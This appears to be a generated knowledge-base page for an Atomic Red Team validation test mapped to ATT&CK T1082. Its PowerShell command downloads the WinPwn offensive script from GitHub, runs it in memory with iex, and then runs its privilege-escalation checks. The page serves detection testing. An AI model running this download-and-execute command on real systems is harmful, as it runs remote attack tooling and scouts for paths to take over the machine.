---
atomic_guid: "5b6f39a2-6ec7-4783-a5fd-2c54a55409ed"
title: "WinPwn - General privesc checks"
framework: "atomic"
generated: "true"
attack_technique_id: "T1082"
attack_technique_name: "System Information Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "5b6f39a2-6ec7-4783-a5fd-2c54a55409ed"
  - "WinPwn - General privesc checks"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - General privesc checks

General privesc checks using the otherchecks function of WinPwn

## Metadata

- Atomic GUID: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
- Technique: T1082: System Information Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1082/T1082.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1082-system_information_discovery|T1082]]

## Executor

- name: powershell

### Command

```powershell
$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.yaml)
